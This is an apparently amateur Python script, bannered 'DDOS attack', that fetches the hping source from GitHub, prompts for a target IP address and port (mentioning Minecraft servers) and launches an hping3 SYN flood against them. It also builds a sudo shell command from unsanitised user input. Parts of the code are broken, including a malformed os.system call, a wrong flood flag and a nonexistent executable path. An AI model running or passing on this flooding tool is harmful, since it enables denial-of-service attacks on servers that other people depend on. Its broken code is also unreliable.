import os
import time
import pyfiglet
import urllib.request
import zipfile
import subprocess


def download_hping3(url, dest_folder):
    file_name = os.path.join(dest_folder, "hping3.zip")
    urllib.request.urlretrieve(url, file_name)
    with zipfile.ZipFile(file_name, 'r') as zip_ref:
        zip_ref.extractall(dest_folder)
    os.remove(file_name)
    print("hping3 heruntergeladen und extrahiert.")

def install_hping3():
    # Pfad anpassen, falls erforderlich
    hping3_folder = os.path.join(os.path.expanduser("~"), "hping3")
    if not os.path.exists(hping3_folder):
        os.makedirs(hping3_folder)
    
    hping3_url = "https://github.com/antirez/hping/archive/refs/heads/master.zip"
    download_hping3(hping3_url, hping3_folder)
    
    hping3_executable = os.path.join(hping3_folder, "hping-master", "hping2-rc3", "hping.exe")
    if os.path.exists(hping3_executable):
        print("hping3 ist installiert. Überprüfen der Installation:")
        subprocess.run([hping3_executable, "-h"])
    else:
        print("Fehler: hping3 konnte nicht installiert werden.")

if __name__ == "__main__":
    install_hping3()


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

banner = pyfiglet.figlet_format('DDOS attack')
print(bcolors.YELLOW + banner)
print(bcolors.GREEN + 'made by Kittyy')

print(bcolors.GREEN + 'Please Enter server Port(you kann use catportscan and Minecraft Port scan) and IP-address:')
user_input2 = input()
user_input = input()
subprocess.run(['hping3', '-flood', '-S', '-p', user_input2 , user_input])
os.system('sudo hping3 -flood -S '+ user_input, '-p '+ user_input2)